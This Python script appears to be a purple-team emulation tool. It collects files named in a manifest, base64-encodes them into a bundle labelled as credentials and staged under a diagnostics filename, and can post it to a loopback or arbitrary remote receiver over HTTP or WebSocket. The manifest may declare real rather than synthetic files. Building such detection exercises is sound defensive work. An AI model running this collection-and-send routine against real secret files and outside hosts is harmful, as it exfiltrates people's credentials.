#!/usr/bin/env python3
"""Read fake files, create a Base64 bundle, and optionally send it to a receiver."""
import argparse
import base64
from datetime import datetime, timezone
import hashlib
import http.client
import json
import os
import re
import socket
import ssl
import stat
import struct
from pathlib import Path
import tempfile
import urllib.parse
import uuid

MARKER = "ASRT-001"
MAX_FILE_BYTES = 65536
MAX_FILES = 32
DEFAULT_PORTS = {"http": 80, "https": 443, "ws": 80, "wss": 443}
WEBSOCKET_TIMEOUT = 5


def load_manifest(filename):
    data = json.loads(Path(filename).read_text(encoding="utf-8"))
    return validate_manifest(data)


def manifest_source(data):
    """Return "synthetic" or "real"; accept the legacy mock_files_only marker."""
    source = data.get("source")
    if source is None:
        source = "synthetic" if data.get("mock_files_only") is True else None
    if source not in ("synthetic", "real"):
        raise ValueError("Manifest must identify synthetic or real source files")
    return source


def validate_manifest(data):
    if data.get("exercise") != MARKER:
        raise ValueError("Manifest must identify this exercise")
    manifest_source(data)
    entries = data.get("files")
    if not isinstance(entries, list) or not 1 <= len(entries) <= MAX_FILES:
        raise ValueError("Manifest requires 1 to 32 exact files")
    seen = set()
    for entry in entries:
        path = entry["path"]
        if not Path(path).is_absolute() or any(c in path for c in "*?[]<>"):
            raise ValueError("Use absolute file paths; no globs or placeholders")
        if path in seen or ".." in Path(path).parts or str(Path(path)) != path:
            raise ValueError("Duplicate or noncanonical path")
        seen.add(path)
        if not re.fullmatch(r"[0-9a-f]{64}", entry["sha256"]):
            raise ValueError("Each file needs its pre-exercise SHA-256")
    return entries


def read_fixture(path):
    # Reject directory scans, special files, and symlink components.
    path = Path(path)
    if any(p.is_symlink() for p in (path, *path.parents)):
        raise ValueError("Symlink paths are not accepted")
    fd = os.open(path, os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK)
    with os.fdopen(fd, "rb") as stream:
        info = os.fstat(stream.fileno())
        if not stat.S_ISREG(info.st_mode) or info.st_size > MAX_FILE_BYTES:
            raise ValueError("Expected a regular file of at most 64 KiB")
        content = stream.read(MAX_FILE_BYTES + 1)
        if len(content) > MAX_FILE_BYTES:
            raise ValueError("File grew beyond the size limit")
        return content


def parse_destination(url):
    """Validate an operator-provided receiver URL and split it into parts."""
    if not isinstance(url, str) or not url or any(not 0x20 < ord(c) < 0x7F for c in url):
        raise ValueError("Destination must be a printable http, https, ws, or wss URL")
    parsed = urllib.parse.urlsplit(url)
    if parsed.scheme not in DEFAULT_PORTS:
        raise ValueError("Destination scheme must be http, https, ws, or wss")
    if not parsed.hostname or parsed.username or parsed.password or parsed.fragment:
        raise ValueError("Destination needs a host without credentials or fragments")
    try:
        port = parsed.port
    except ValueError:
        raise ValueError("Destination port is not a valid number")
    if port is None:
        port = DEFAULT_PORTS[parsed.scheme]
    if not 1 <= port <= 65535:
        raise ValueError("Destination port must be between 1 and 65535")
    path = parsed.path or "/"
    if not path.startswith("/"):
        raise ValueError("Destination path must start with /")
    if parsed.query:
        path += "?" + parsed.query
    return {"scheme": parsed.scheme, "host": parsed.hostname, "port": port, "path": path}


def connect_host(parts):
    # http.client and the WebSocket handshake need bracketed IPv6 literals.
    return "[" + parts["host"] + "]" if ":" in parts["host"] else parts["host"]


def send_http(parts, body):
    # One POST; no redirects, no proxy environment; https verifies certificates.
    if parts["scheme"] == "https":
        connection = http.client.HTTPSConnection(connect_host(parts), parts["port"], timeout=5)
    else:
        connection = http.client.HTTPConnection(connect_host(parts), parts["port"], timeout=5)
    try:
        connection.request("POST", parts["path"], body=body, headers={
            "Content-Type": "application/octet-stream",
            "X-Purple-Team": MARKER,
        })
        response = connection.getresponse()
        if response.status != 204:
            raise RuntimeError("Receiver returned HTTP status " + str(response.status))
        return response.status
    finally:
        connection.close()


def apply_mask(data, mask):
    if not data:
        return b""
    repeated = (mask * ((len(data) + 3) // 4))[:len(data)]
    return (int.from_bytes(data, "big") ^ int.from_bytes(repeated, "big")).to_bytes(len(data), "big")


def websocket_frame(opcode, payload):
    # Client-to-server frames must be masked (RFC 6455 section 5.3).
    length = len(payload)
    if length < 126:
        header = struct.pack("!BB", 0x80 | opcode, 0x80 | length)
    elif length < 65536:
        header = struct.pack("!BBH", 0x80 | opcode, 0x80 | 126, length)
    else:
        header = struct.pack("!BBQ", 0x80 | opcode, 0x80 | 127, length)
    mask = os.urandom(4)
    return header + mask + apply_mask(payload, mask)


def read_websocket_status(connection):
    head = bytearray()
    while b"\r\n\r\n" not in head:
        chunk = connection.recv(1)
        if not chunk:
            raise OSError("Receiver closed during the handshake")
        head += chunk
        if len(head) > 8192:
            raise ValueError("Oversized handshake response")
    fields = head.split(b"\r\n", 1)[0].decode("ascii", "replace").split()
    if len(fields) < 2 or not fields[1].isdigit():
        raise ValueError("Malformed handshake response")
    return int(fields[1])


def send_websocket(parts, body):
    # Minimal RFC 6455 client: one upgrade, one masked binary frame, then close.
    # wss verifies certificates with the default TLS context.
    connection = socket.create_connection((parts["host"], parts["port"]), timeout=WEBSOCKET_TIMEOUT)
    try:
        if parts["scheme"] == "wss":
            context = ssl.create_default_context()
            connection = context.wrap_socket(connection, server_hostname=parts["host"])
        authority = connect_host(parts)
        if parts["port"] != DEFAULT_PORTS[parts["scheme"]]:
            authority += ":" + str(parts["port"])
        request = "\r\n".join([
            "GET {} HTTP/1.1".format(parts["path"]),
            "Host: " + authority,
            "Upgrade: websocket",
            "Connection: Upgrade",
            "Sec-WebSocket-Key: " + base64.b64encode(os.urandom(16)).decode("ascii"),
            "Sec-WebSocket-Version: 13",
            "", "",
        ]).encode("ascii")
        connection.sendall(request)
        status = read_websocket_status(connection)
        if status != 101:
            raise RuntimeError("Receiver returned HTTP status " + str(status))
        connection.sendall(websocket_frame(0x2, body))
        connection.sendall(websocket_frame(0x8, b""))
        return status
    finally:
        connection.close()


def run(manifest, send_loopback=False, send_to=None):
    if send_loopback and send_to:
        raise ValueError("Choose one transfer option: --send-loopback or --send-to")
    destination = str(send_to) if send_to else ("http://127.0.0.1:8765/asrt" if send_loopback else None)
    parts = parse_destination(destination) if destination else None
    document = json.loads(Path(manifest).read_text(encoding="utf-8"))
    source = manifest_source(document)
    entries = validate_manifest(document)
    run_id = str(uuid.uuid4())
    root = Path(tempfile.mkdtemp(prefix="asrt-"))
    events = root / "events.jsonl"

    def emit(event, **details):
        record = dict(marker=MARKER, run_id=run_id,
                      timestamp=datetime.now(timezone.utc).isoformat(),
                      event=event, pid=os.getpid(), ppid=os.getppid(), **details)
        line = json.dumps(record, sort_keys=True)
        with events.open("a", encoding="utf-8") as stream:
            stream.write(line + "\n")
        print(line, flush=True)

    emit("execution_started", artifact_directory=str(root))
    collected = {}
    rejected = 0
    for entry in entries:
        path = entry["path"]
        emit("fixture_read_attempt", path=path)
        try:
            content = read_fixture(path)
        except FileNotFoundError:
            emit("fixture_missing", path=path)
            rejected += 1
            continue
        except (OSError, ValueError) as exc:
            emit("fixture_unavailable", path=path, error=str(exc))
            rejected += 1
            continue
        if hashlib.sha256(content).hexdigest() != entry["sha256"]:
            emit("fixture_mismatch", path=path)
            rejected += 1
            continue
        collected[path] = base64.b64encode(content).decode("ascii")
        emit("fixture_read", path=path, bytes=len(content))
    if rejected:
        emit("execution_incomplete", rejected_files=rejected)
        return 2
    payload = json.dumps(dict(marker=MARKER, run_id=run_id, source=source,
                              content_encoding="base64",
                              credentials=collected), sort_keys=True).encode()
    encoded = base64.b64encode(payload)
    stage = root / "diagnostics.b64"
    with stage.open("xb") as stream:
        stream.write(encoded)
    emit("bundle_staged", path=str(stage), bytes=len(encoded),
         sha256=hashlib.sha256(encoded).hexdigest())
    if parts:
        # No redirects, no proxy environment; the destination is recorded in the events.
        emit("transfer_attempt", destination=destination)
        try:
            if parts["scheme"] in ("http", "https"):
                status = send_http(parts, encoded)
            else:
                status = send_websocket(parts, encoded)
            emit("transfer_acknowledged", status=status)
        except (OSError, ValueError, http.client.HTTPException, RuntimeError) as exc:
            emit("transfer_failed", error=str(exc))
            return 1
    emit("execution_completed",
         mode="loopback" if send_loopback else ("remote" if send_to else "offline"))
    return 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--manifest", required=True, help="Prepared fake-file manifest")
    transfer = parser.add_mutually_exclusive_group()
    transfer.add_argument("--send-loopback", action="store_true",
                          help="Send the bundle to the receiver at 127.0.0.1:8765")
    transfer.add_argument("--send-to", dest="send_to", metavar="URL",
                          help="Send the bundle to an http, https, ws, or wss receiver URL")
    args = parser.parse_args()
    raise SystemExit(run(args.manifest, args.send_loopback, args.send_to))
